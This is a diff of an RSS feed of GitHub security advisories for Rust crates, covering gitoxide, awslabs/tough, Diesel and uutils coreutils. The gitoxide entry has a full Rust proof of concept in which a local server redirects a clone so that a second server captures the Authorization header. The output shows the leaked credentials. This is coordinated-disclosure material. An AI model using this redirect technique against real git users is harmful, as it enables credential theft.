@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/rust.rss</id>
     <title>Security Advisory for Rust crates</title>
-    <updated>2026-05-05T17:56:51.128Z</updated>
+    <updated>2026-05-05T19:17:26.513Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arust"/>
     <subtitle>Security Advisory for Rust crates on GitHub</subtitle>
@@ -11,6 +11,444 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[gix-transport] gix-transport: HTTP credentials leaked to redirected host in curl backend]]></title>
+        <id>https://github.com/advisories/GHSA-9857-6mw7-fq2m</id>
+        <link href="https://github.com/advisories/GHSA-9857-6mw7-fq2m"/>
+        <updated>2026-05-05T19:16:36.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The curl-based HTTP transport in <code>gix-transport</code> sends user credentials (passwords, tokens) to an attacker-controlled server after an HTTP redirect. When a server responds with a 302 redirect during the initial <code>GET /info/refs</code>, gitoxide records the redirected base URL and rewrites all subsequent requests to point at the redirected host. The <code>Authorization</code> header is still attached because <code>add_basic_auth_if_present()</code> only checks <code>self.url</code> (the original, never-updated URL).</p>
+<p>The reqwest backend is not affected. Its custom redirect policy at <code>reqwest/remote.rs</code> lines 60-64 compares <code>prev_url.host_str()</code> to <code>curr_url.host_str()</code> and calls <code>attempt.stop()</code> on cross-domain redirects, so <code>redirected_base_url</code> is never set to a different host.</p>
+<h2 id="details">Details</h2>
+<p>The vulnerability involves two components in <code>gix-transport</code>:</p>
+<p><strong>1. URL rewriting after redirect</strong> (<a href="https://github.com/GitoxideLabs/gitoxide/blob/main/gix-transport/src/client/blocking_io/http/curl/remote.rs">gix-transport/src/client/blocking_io/http/curl/remote.rs</a>)</p>
+<p>After a request completes, the effective URL is compared to the requested URL. If they differ (redirect occurred), the new base URL is stored (lines 355-359). On subsequent requests, <code>swap_tails()</code> rewrites the target URL to point at the redirected host (line 166).</p>
+<p><strong>2. Credential check uses original URL</strong> (<a href="https://github.com/GitoxideLabs/gitoxide/blob/main/gix-transport/src/client/blocking_io/http/mod.rs#L293">gix-transport/src/client/blocking_io/http/mod.rs, lines 293-312</a>)</p>
+<p><code>add_basic_auth_if_present()</code> checks <code>self.url</code> (set once during construction, never mutated) to decide whether to attach credentials. Since <code>self.url</code> always points to the original host, credentials are approved even when the actual request goes to the redirected (attacker) host.</p>
+<p>The <code>Authorization</code> header is added to the headers list in <code>handshake()</code> (line 374) and <code>request()</code> (line 434) before being passed to the backend, which applies them to the rewritten URL via <code>handle.http_headers(headers)</code> (line 309).</p>
+<h3 id="attack-flow-cross-domain-credential-leak">Attack flow: cross-domain credential leak</h3>
+<ol>
+<li>Victim clones <code>https://legitimate.com/repo</code> with credentials configured</li>
+<li>Server returns 302 redirect on <code>GET /info/refs</code> to <code>https://attacker.com/...</code></li>
+<li>Curl follows the redirect and strips <code>Authorization</code> for this GET (safe so far)</li>
+<li>Attacker serves a valid info/refs response; <code>redirected_base_url</code> is set</li>
+<li><code>POST /git-upload-pack</code> is rewritten via <code>swap_tails()</code> to <code>attacker.com</code></li>
+<li><code>add_basic_auth_if_present()</code> checks <code>self.url</code> (still <code>legitimate.com</code>), approves credential sending</li>
+<li><code>Authorization: Basic &lt;credentials&gt;</code> is sent to <code>attacker.com</code></li>
+</ol>
+<p>Curl's cross-domain header stripping only protects the redirected GET. It does not protect the POST, which is a new request with credentials re-attached by gitoxide.</p>
+<h3 id="secondary-vector-https-to-http-downgrade">Secondary vector: HTTPS-to-HTTP downgrade</h3>
+<p>The cleartext protection at <code>mod.rs</code> line 300-305 also checks <code>self.url</code>:</p>
+<pre><code class="language-rust">if self.url.starts_with("http://") {
+    return Err(client::Error::AuthenticationRefused("..."));
+}
+</code></pre>
+<p>This only validates the original URL's scheme, not the effective URL after redirect. A redirect from <code>https://legitimate.com</code> to <code>http://attacker.com</code> bypasses this check, causing credentials to be sent in cleartext over HTTP.</p>
+<ol>
+<li>Victim clones <code>https://legitimate.com/repo</code> with credentials</li>
+<li>Server redirects to <code>http://attacker.com/...</code> (note: HTTP, not HTTPS)</li>
+<li><code>add_basic_auth_if_present()</code> checks <code>self.url</code> (still <code>https://</code>), allows credentials</li>
+<li><code>Authorization</code> header is sent over unencrypted HTTP to <code>attacker.com</code></li>
+</ol>
+<h2 id="poc">PoC</h2>
+<p>A complete Rust project that reproduces the issue. It starts two local TCP servers (legitimate on :8080, attacker on :9090) and uses <code>gix-transport</code> to demonstrate the credential leak.</p>
+<p><strong>To run:</strong> Create the project next to the gitoxide checkout so path dependencies resolve, then <code>cargo run</code>.</p>
+<details>
+<summary>Cargo.toml</summary>
+
+<pre><code class="language-toml">[package]
+name = "poc-gitoxide-redirect"
+version = "0.1.0"
+edition = "2021"
+
+[dependencies]
+# http-client-insecure-credentials is only needed because the PoC uses http://
+# to avoid TLS setup. A real attack would use https:// and not require this feature.
+gix-transport = { path = "../gitoxide/gix-transport", features = ["http-client-curl", "http-client-insecure-credentials"] }
+gix-sec = { path = "../gitoxide/gix-sec" }
+gix-url = { path = "../gitoxide/gix-url" }
+gix-packetline = { path = "../gitoxide/gix-packetline", features = ["blocking-io"] }
+</code></pre>
+</details>
+
+<details>
+<summary>src/main.rs</summary>
+
+<pre><code class="language-rust">use std::io::{BufRead, BufReader, Write};
+use std::net::TcpListener;
+use std::sync::mpsc;
+use std::thread;
+
+use gix_transport::client::{self, blocking_io::http, blocking_io::Transport, TransportWithoutIO};
+
+fn main() {
+    println!("=== gitoxide HTTP credential leak via redirect ===\n");
+
+    let (captured_tx, captured_rx) = mpsc::channel::&lt;Vec&lt;String&gt;&gt;();
+
+    // Attacker server (port 9090): captures credentials
+    let attacker = TcpListener::bind("127.0.0.1:9090").expect("bind attacker");
+    let attacker_handle = thread::spawn(move || {
+        let (mut conn1, _) = attacker.accept().expect("accept conn1");
+        let mut reader1 = BufReader::new(conn1.try_clone().unwrap());
+        let mut headers1 = Vec::new();
+        loop {
+            let mut line = String::new();
+            reader1.read_line(&amp;mut line).unwrap();
+            if line.trim().is_empty() { break; }
+            headers1.push(line.trim().to_string());
+        }
+        println!("[attacker] GET /info/refs headers (from redirect):");
+        for h in &amp;headers1 { println!("  {h}"); }
+
+        let pkt_service = "001e# service=git-upload-pack\n";
+        let pkt_flush = "0000";
+        let fake_hash = "a".repeat(40);
+        let caps = "multi_ack thin-pack side-band side-band-64k ofs-delta shallow no-progress include-tag";
+        let ref_line = format!("{fake_hash} HEAD\0{caps}\n");
+        let ref_pkt = format!("{:04x}{ref_line}", ref_line.len() + 4);
+        let body = format!("{pkt_service}{pkt_flush}{ref_pkt}{pkt_flush}");
+        let response = format!(
+            "HTTP/1.1 200 OK\r\nContent-Type: application/x-git-upload-pack-advertisement\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
+            body.len()
+        );
+        conn1.write_all(response.as_bytes()).unwrap();
+        conn1.flush().unwrap();
+        drop(conn1);
+
+        let (mut conn2, _) = attacker.accept().expect("accept conn2");
+        let mut reader2 = BufReader::new(conn2.try_clone().unwrap());
+        let mut headers2 = Vec::new();
+        let mut content_length: usize = 0;
+        loop {
+            let mut line = String::new();
+            reader2.read_line(&amp;mut line).unwrap();
+            if line.trim().is_empty() { break; }
+            let trimmed = line.trim().to_string();
+            if let Some(cl) = trimmed.strip_prefix("Content-Length: ") {
+                content_length = cl.parse().unwrap_or(0);
+            }
+            headers2.push(trimmed);
+        }
+        if content_length &gt; 0 {
+            let mut body_buf = vec![0u8; content_length];
+            use std::io::Read;
+            reader2.read_exact(&amp;mut body_buf).ok();
+        }
+
+        println!("\n[attacker] POST /git-upload-pack headers:");
+        for h in &amp;headers2 {
+            let prefix = if h.starts_with("Authorization:") { "  &gt;&gt;&gt; LEAKED: " } else { "  " };
+            println!("{prefix}{h}");
+        }
+
+        let resp_body = "0000";
+        let response2 = format!(
+            "HTTP/1.1 200 OK\r\nContent-Type: application/x-git-upload-pack-result\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{resp_body}",
+            resp_body.len()
+        );
+        conn2.write_all(response2.as_bytes()).unwrap();
+        conn2.flush().unwrap();
+        drop(conn2);
+
+        captured_tx.send(headers2).ok();
+    });
+
+    // Legitimate server (port 8080): redirects to attacker
+    let legit = TcpListener::bind("127.0.0.1:8080").expect("bind legit");
+    let legit_handle = thread::spawn(move || {
+        let (mut conn, _) = legit.accept().expect("accept legit");
+        let mut reader = BufReader::new(conn.try_clone().unwrap());
+        let mut request_line = String::new();
+        reader.read_line(&amp;mut request_line).unwrap();
+        println!("[legit] Received: {}", request_line.trim());
+        loop {
+            let mut line = String::new();
+            reader.read_line(&amp;mut line).unwrap();
+            if line.trim().is_empty() { break; }
+        }
+        let redirect_url = "http://127.0.0.1:9090/repo.git/info/refs?service=git-upload-pack";
+        let response = format!(
+            "HTTP/1.1 302 Found\r\nLocation: {redirect_url}\r\nContent-Length: 0\r\n\r\n"
+        );
+        conn.write_all(response.as_bytes()).unwrap();
+        conn.flush().unwrap();
+        println!("[legit] Sent 302 redirect to attacker server");
+    });
+
+    thread::sleep(std::time::Duration::from_millis(100));
+
+    println!("\n[client] Connecting to http://127.0.0.1:8080/repo.git with credentials...");
+    let url: gix_url::Url = "http://127.0.0.1:8080/repo.git".try_into().expect("parse url");
+    let mut transport: http::Transport&lt;http::curl::Curl&gt; =
+        http::connect(url, gix_transport::Protocol::V1, false);
+    transport
+        .set_identity(gix_sec::identity::Account {
+            username: "victim-user".into(),
+            password: "super-secret-token".into(),
+            oauth_refresh_token: None,
+        })
+        .expect("set identity");
+
+    println!("[client] Performing handshake (GET /info/refs)...");
+    match transport.handshake(gix_transport::Service::UploadPack, &amp;[]) {
+        Ok(_) =&gt; println!("[client] Handshake succeeded"),
+        Err(e) =&gt; println!("[client] Handshake error: {e}"),
+    }
+
+    println!("[client] Sending request (POST /git-upload-pack)...");
+    match transport.request(client::WriteMode::Binary, client::MessageKind::Flush, false) {
+        Ok(_writer) =&gt; println!("[client] Request sent"),
+        Err(e) =&gt; println!("[client] Request error: {e}"),
+    }
+
+    legit_handle.join().ok();
+    attacker_handle.join().ok();
+
+    println!("\n=== RESULT ===");
+    if let Ok(headers) = captured_rx.recv_timeout(std::time::Duration::from_secs(2)) {
+        let leaked = headers.iter().any(|h| h.starts_with("Authorization:"));
+        if leaked {
+            let auth = headers.iter().find(|h| h.starts_with("Authorization:")).unwrap();
+            println!("VULNERABLE: Credentials leaked to attacker server!");
+            println!("Captured: {auth}");
+        } else {
+            println!("NOT VULNERABLE: No credentials captured.");
+        }
+    } else {
+        println!("ERROR: Timed out.");
+    }
+}
+</code></pre>
+</details>
+
+<p><strong>Output:</strong></p>
+<pre><code>[attacker] GET /info/refs headers (from redirect):
+  GET /repo.git/info/refs?service=git-upload-pack HTTP/1.1
+  Host: 127.0.0.1:9090
+  Accept: */*
+  User-Agent: git/oxide-0.55.0
+
+[attacker] POST /git-upload-pack headers:
+  POST /repo.git/git-upload-pack HTTP/1.1
+  Host: 127.0.0.1:9090
+  &gt;&gt;&gt; LEAKED: Authorization: Basic dmljdGltLXVzZXI6c3VwZXItc2VjcmV0LXRva2Vu
+
+VULNERABLE: Credentials leaked to attacker server!
+Captured: Authorization: Basic dmljdGltLXVzZXI6c3VwZXItc2VjcmV0LXRva2Vu
+</code></pre>
+<p>The GET (from redirect) has no <code>Authorization</code> header. The POST carries the full credentials. The base64 decodes to <code>victim-user:super-secret-token</code>.</p>
+<h2 id="impact">Impact</h2>
+<p>Any user who clones or fetches over HTTP(S) using gitoxide with the curl backend (<code>http-client-curl</code> feature) can have their credentials stolen by an attacker who controls a redirect target (via compromised server, DNS hijacking, or MITM). The only user interaction required is initiating the clone or fetch; the redirect and credential leak happen transparently. CI/CD pipelines using tokens are also at risk.</p>
+<h2 id="suggested-fix">Suggested Fix</h2>
+<ol>
+<li>Only attach <code>Authorization</code> if the effective URL's host matches the original URL's host.</li>
+<li>Or block cross-origin redirects in the curl backend, matching reqwest's behavior.</li>
+<li>Check the effective URL's scheme (not the original) for the HTTPS-to-HTTP downgrade.</li>
+</ol>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/GitoxideLabs/gitoxide/security/advisories/GHSA-9857-6mw7-fq2m">https://github.com/GitoxideLabs/gitoxide/security/advisories/GHSA-9857-6mw7-fq2m</a></li>
+<li><a href="https://github.com/advisories/GHSA-9857-6mw7-fq2m">https://github.com/advisories/GHSA-9857-6mw7-fq2m</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-9857-6mw7-fq2m</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-05T19:16:35.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[tuftool] awslabs/tough is Missing Delegated Metadata Validation]]></title>
+        <id>https://github.com/advisories/GHSA-4v58-8p28-2rq3</id>
+        <link href="https://github.com/advisories/GHSA-4v58-8p28-2rq3"/>
+        <updated>2026-05-05T18:46:50.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Missing expiration, hash, and length enforcement in delegated metadata validation in awslabs/tough before tough-v0.22.0 allows remote authenticated users with delegated signing authority to bypass TUF specification integrity checks for delegated targets metadata and poison the local metadata cache, because load_delegations does not apply the same validation checks as the top-level targets metadata path.</p>
+<h3 id="impact">Impact</h3>
+<p>The tough library, prior to 0.22.0, does not properly verify delegated target metadata. It allows someone with write access to the metadata to serve expired or otherwise invalid targets from a TUF repository which tough will then trust rather than reject.</p>
+<h3 id="impacted-versions">Impacted Versions:</h3>
+<p>tough 0.9.0 through 0.21.x, tuftool through 0.14.x</p>
+<h3 id="patches">Patches</h3>
+<p>This issue has been addressed in tough version 0.22.0 and tuftool version 0.15.0. We recommend upgrading to the latest version and ensuring any forked or derivative code is patched to incorporate the new fixes. </p>
+<h3 id="workarounds">Workarounds</h3>
+<p>No workarounds to this issue are known.</p>
+<h3 id="references">References</h3>
+<ul>
+<li>CVE-2026-6967
+If there are any questions or comments about this advisory, please contact [AWS/Amazon] Security via the <a href="https://aws.amazon.com/security/vulnerability-reporting">vulnerability reporting page</a> or directly via email to <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</li>
+</ul>
+<h3 id="acknowledgement">Acknowledgement</h3>
+<p>Amazon Web Services Labs would like to thank Oleh Konko of 1seal for collaborating on this issue through the coordinated vulnerability disclosure process.</p>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/awslabs/tough/security/advisories/GHSA-4v58-8p28-2rq3">https://github.com/awslabs/tough/security/advisories/GHSA-4v58-8p28-2rq3</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-6967">https://nvd.nist.gov/vuln/detail/CVE-2026-6967</a></li>
+<li><a href="https://aws.amazon.com/security/security-bulletins/2026-019-aws">https://aws.amazon.com/security/security-bulletins/2026-019-aws</a></li>
+<li><a href="https://crates.io/crates/tough/0.22.0">https://crates.io/crates/tough/0.22.0</a></li>
+<li><a href="https://crates.io/crates/tuftool/0.15.0">https://crates.io/crates/tuftool/0.15.0</a></li>
+<li><a href="https://github.com/awslabs/tough/releases/tag/tough-v0.22.0">https://github.com/awslabs/tough/releases/tag/tough-v0.22.0</a></li>
+<li><a href="https://github.com/awslabs/tough/releases/tag/tuftool-v0.15.0">https://github.com/awslabs/tough/releases/tag/tuftool-v0.15.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-4v58-8p28-2rq3">https://github.com/advisories/GHSA-4v58-8p28-2rq3</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-4v58-8p28-2rq3</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-05T18:46:48.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[tough] awslabs/tough is Missing Delegated Metadata Validation]]></title>
+        <id>https://github.com/advisories/GHSA-4v58-8p28-2rq3</id>
+        <link href="https://github.com/advisories/GHSA-4v58-8p28-2rq3"/>
+        <updated>2026-05-05T18:46:50.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Missing expiration, hash, and length enforcement in delegated metadata validation in awslabs/tough before tough-v0.22.0 allows remote authenticated users with delegated signing authority to bypass TUF specification integrity checks for delegated targets metadata and poison the local metadata cache, because load_delegations does not apply the same validation checks as the top-level targets metadata path.</p>
+<h3 id="impact">Impact</h3>
+<p>The tough library, prior to 0.22.0, does not properly verify delegated target metadata. It allows someone with write access to the metadata to serve expired or otherwise invalid targets from a TUF repository which tough will then trust rather than reject.</p>
+<h3 id="impacted-versions">Impacted Versions:</h3>
+<p>tough 0.9.0 through 0.21.x, tuftool through 0.14.x</p>
+<h3 id="patches">Patches</h3>
+<p>This issue has been addressed in tough version 0.22.0 and tuftool version 0.15.0. We recommend upgrading to the latest version and ensuring any forked or derivative code is patched to incorporate the new fixes. </p>
+<h3 id="workarounds">Workarounds</h3>
+<p>No workarounds to this issue are known.</p>
+<h3 id="references">References</h3>
+<ul>
+<li>CVE-2026-6967
+If there are any questions or comments about this advisory, please contact [AWS/Amazon] Security via the <a href="https://aws.amazon.com/security/vulnerability-reporting">vulnerability reporting page</a> or directly via email to <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</li>
+</ul>
+<h3 id="acknowledgement">Acknowledgement</h3>
+<p>Amazon Web Services Labs would like to thank Oleh Konko of 1seal for collaborating on this issue through the coordinated vulnerability disclosure process.</p>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/awslabs/tough/security/advisories/GHSA-4v58-8p28-2rq3">https://github.com/awslabs/tough/security/advisories/GHSA-4v58-8p28-2rq3</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-6967">https://nvd.nist.gov/vuln/detail/CVE-2026-6967</a></li>
+<li><a href="https://aws.amazon.com/security/security-bulletins/2026-019-aws">https://aws.amazon.com/security/security-bulletins/2026-019-aws</a></li>
+<li><a href="https://crates.io/crates/tough/0.22.0">https://crates.io/crates/tough/0.22.0</a></li>
+<li><a href="https://crates.io/crates/tuftool/0.15.0">https://crates.io/crates/tuftool/0.15.0</a></li>
+<li><a href="https://github.com/awslabs/tough/releases/tag/tough-v0.22.0">https://github.com/awslabs/tough/releases/tag/tough-v0.22.0</a></li>
+<li><a href="https://github.com/awslabs/tough/releases/tag/tuftool-v0.15.0">https://github.com/awslabs/tough/releases/tag/tuftool-v0.15.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-4v58-8p28-2rq3">https://github.com/advisories/GHSA-4v58-8p28-2rq3</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-4v58-8p28-2rq3</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-05T18:46:48.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[tuftool] awslabs/tough Delegated Roles have a Signature Threshold Bypass]]></title>
+        <id>https://github.com/advisories/GHSA-8m7c-8m39-rv4x</id>
+        <link href="https://github.com/advisories/GHSA-8m7c-8m39-rv4x"/>
+        <updated>2026-05-05T18:46:10.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Improper verification of cryptographic signature uniqueness in delegated role validation in awslabs/tough before tough-v0.22.0 allows remote authenticated users to bypass the TUF signature threshold requirement by duplicating a valid signature, causing the client to accept forged delegated role metadata.</p>
+<h3 id="impact">Impact</h3>
+<p>The tough library, prior to 0.22.0, does not properly verify the uniqueness of keys in the signatures provided to meet the threshold of cryptographic signatures in delegated targets. It allows actors with access to a valid signing key to create multiple valid signatures in order to circumvent TUF requiring a minimum threshold of unique keys before the metadata is considered valid.</p>
+<h3 id="patches">Patches</h3>
+<p>This issue has been addressed in tough version 0.22.0 and tuftool version 0.15.0. We recommend upgrading to the latest version and ensuring any forked or derivative code is patched to incorporate the new fixes. </p>
+<h3 id="workarounds">Workarounds</h3>
+<p>No workarounds to this issue are known.</p>
+<h3 id="references">References</h3>
+<ul>
+<li>CVE-2026-6966</li>
+</ul>
+<p>If there are any questions or comments about this advisory, please contact [AWS/Amazon] Security via the <a href="https://aws.amazon.com/security/vulnerability-reporting">vulnerability reporting page</a> or directly via email to <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>
+<h3 id="acknowledgement">Acknowledgement</h3>
+<p>Amazon Web Services Labs would like to thank Emily Albini of Oxide Computer and Oleh Konko of 1seal for collaborating on this issue through the coordinated vulnerability disclosure process</p>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/awslabs/tough/security/advisories/GHSA-8m7c-8m39-rv4x">https://github.com/awslabs/tough/security/advisories/GHSA-8m7c-8m39-rv4x</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-6966">https://nvd.nist.gov/vuln/detail/CVE-2026-6966</a></li>
+<li><a href="https://aws.amazon.com/security/security-bulletins/2026-019-aws">https://aws.amazon.com/security/security-bulletins/2026-019-aws</a></li>
+<li><a href="https://crates.io/crates/tough/0.22.0">https://crates.io/crates/tough/0.22.0</a></li>
+<li><a href="https://crates.io/crates/tuftool/0.15.0">https://crates.io/crates/tuftool/0.15.0</a></li>
+<li><a href="https://github.com/awslabs/tough/releases/tag/tough-v0.22.0">https://github.com/awslabs/tough/releases/tag/tough-v0.22.0</a></li>
+<li><a href="https://github.com/awslabs/tough/releases/tag/tuftool-v0.15.0">https://github.com/awslabs/tough/releases/tag/tuftool-v0.15.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-8m7c-8m39-rv4x">https://github.com/advisories/GHSA-8m7c-8m39-rv4x</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-8m7c-8m39-rv4x</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-05T18:46:09.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[tough] awslabs/tough Delegated Roles have a Signature Threshold Bypass]]></title>
+        <id>https://github.com/advisories/GHSA-8m7c-8m39-rv4x</id>
+        <link href="https://github.com/advisories/GHSA-8m7c-8m39-rv4x"/>
+        <updated>2026-05-05T18:46:10.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Improper verification of cryptographic signature uniqueness in delegated role validation in awslabs/tough before tough-v0.22.0 allows remote authenticated users to bypass the TUF signature threshold requirement by duplicating a valid signature, causing the client to accept forged delegated role metadata.</p>
+<h3 id="impact">Impact</h3>
+<p>The tough library, prior to 0.22.0, does not properly verify the uniqueness of keys in the signatures provided to meet the threshold of cryptographic signatures in delegated targets. It allows actors with access to a valid signing key to create multiple valid signatures in order to circumvent TUF requiring a minimum threshold of unique keys before the metadata is considered valid.</p>
+<h3 id="patches">Patches</h3>
+<p>This issue has been addressed in tough version 0.22.0 and tuftool version 0.15.0. We recommend upgrading to the latest version and ensuring any forked or derivative code is patched to incorporate the new fixes. </p>
+<h3 id="workarounds">Workarounds</h3>
+<p>No workarounds to this issue are known.</p>
+<h3 id="references">References</h3>
+<ul>
+<li>CVE-2026-6966</li>
+</ul>
+<p>If there are any questions or comments about this advisory, please contact [AWS/Amazon] Security via the <a href="https://aws.amazon.com/security/vulnerability-reporting">vulnerability reporting page</a> or directly via email to <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>
+<h3 id="acknowledgement">Acknowledgement</h3>
+<p>Amazon Web Services Labs would like to thank Emily Albini of Oxide Computer and Oleh Konko of 1seal for collaborating on this issue through the coordinated vulnerability disclosure process</p>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/awslabs/tough/security/advisories/GHSA-8m7c-8m39-rv4x">https://github.com/awslabs/tough/security/advisories/GHSA-8m7c-8m39-rv4x</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-6966">https://nvd.nist.gov/vuln/detail/CVE-2026-6966</a></li>
+<li><a href="https://aws.amazon.com/security/security-bulletins/2026-019-aws">https://aws.amazon.com/security/security-bulletins/2026-019-aws</a></li>
+<li><a href="https://crates.io/crates/tough/0.22.0">https://crates.io/crates/tough/0.22.0</a></li>
+<li><a href="https://crates.io/crates/tuftool/0.15.0">https://crates.io/crates/tuftool/0.15.0</a></li>
+<li><a href="https://github.com/awslabs/tough/releases/tag/tough-v0.22.0">https://github.com/awslabs/tough/releases/tag/tough-v0.22.0</a></li>
+<li><a href="https://github.com/awslabs/tough/releases/tag/tuftool-v0.15.0">https://github.com/awslabs/tough/releases/tag/tuftool-v0.15.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-8m7c-8m39-rv4x">https://github.com/advisories/GHSA-8m7c-8m39-rv4x</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-8m7c-8m39-rv4x</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-05T18:46:09.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[diesel] Diesel's SQLite backend has possible UTF-8 corruption]]></title>
+        <id>https://github.com/advisories/GHSA-h5x4-m2qf-r4f2</id>
+        <link href="https://github.com/advisories/GHSA-h5x4-m2qf-r4f2"/>
+        <updated>2026-05-05T18:08:05.000Z</updated>
+        <content type="html"><![CDATA[<p>Diesel uses the <code>sqlite3_value_text</code> function to receive strings from SQLite while deserializing query results. We misinterpreted the corresponding <a href="https://sqlite.org/c3ref/value_blob.html">SQLite</a> documentation that this function always returns a UTF-8 encoded string values as <code>*const c_char</code>. Based on that we used <code>str::from_utf8_unchecked</code> to construct a Rust string slice without any additional UTF-8 checks in place. It turned out that this function doesn't always return correct UTF-8 strings. For field of the SQLite side storage type <code>BLOB</code> this pointer can contain arbitrary bytes, which makes the usage of <code>str::from_utf8_unchecked</code> unsound as this violates the safety contract of <code>str</code> to only contain valid UTF-8 encoded Strings.</p>
+<h2 id="mitigation">Mitigation</h2>
+<p>The preferred mitigation to the outlined problem is to update to a Diesel version 2.3.8 or newer, which includes fixes for the problem.</p>
+<h2 id="resolution">Resolution</h2>
+<p>Diesel now correctly checks whether the provides byte buffer is actually valid UTF-8, instead of relying on SQLite's documentation. This fix is included in the <code>2.3.8</code> release.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/diesel-rs/diesel/pull/5042">https://github.com/diesel-rs/diesel/pull/5042</a></li>
+<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0111.html">https://rustsec.org/advisories/RUSTSEC-2026-0111.html</a></li>
+<li><a href="https://github.com/advisories/GHSA-h5x4-m2qf-r4f2">https://github.com/advisories/GHSA-h5x4-m2qf-r4f2</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-h5x4-m2qf-r4f2</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-05T18:08:05.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[sequoia-git] sequoia-git has broken hard revocation handling]]></title>
         <id>https://github.com/advisories/GHSA-g27r-r6ph-vf5r</id>
@@ -336,135 +774,5 @@ the latest commit will not carry the hard revocation, and <code>sq-git</code> wi
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-04-22T18:31:46.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[coreutils] uutils coreutils has a UNIX Symbolic Link (Symlink) Following issue]]></title>
-        <id>https://github.com/advisories/GHSA-wq63-vh5h-pr5p</id>
-        <link href="https://github.com/advisories/GHSA-wq63-vh5h-pr5p"/>
-        <updated>2026-04-30T17:53:38.000Z</updated>
-        <content type="html"><![CDATA[<p>A logic error in the ln utility of uutils coreutils allows the utility to dereference a symbolic link target even when the --no-dereference (or -n) flag is explicitly provided. The implementation previously only honored the "no-dereference" intent if the --force (overwrite) mode was also enabled. This flaw causes ln to follow a symbolic link that points to a directory and create new links inside that target directory instead of treating the symbolic link itself as the destination. In environments where a privileged user or system script uses ln -n to update a symlink, a local attacker could manipulate existing symbolic links to redirect file creation into sensitive directories, potentially leading to unauthorized file creation or system misconfiguration.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-35372">https://nvd.nist.gov/vuln/detail/CVE-2026-35372</a></li>
-<li><a href="https://github.com/uutils/coreutils/pull/11253">https://github.com/uutils/coreutils/pull/11253</a></li>
-<li><a href="https://github.com/uutils/coreutils/releases/tag/0.8.0">https://github.com/uutils/coreutils/releases/tag/0.8.0</a></li>
-<li><a href="https://github.com/uutils/coreutils/commit/394c4b17f2f382b4be9f54389bcb79028de02f39">https://github.com/uutils/coreutils/commit/394c4b17f2f382b4be9f54389bcb79028de02f39</a></li>
-<li><a href="https://github.com/advisories/GHSA-wq63-vh5h-pr5p">https://github.com/advisories/GHSA-wq63-vh5h-pr5p</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
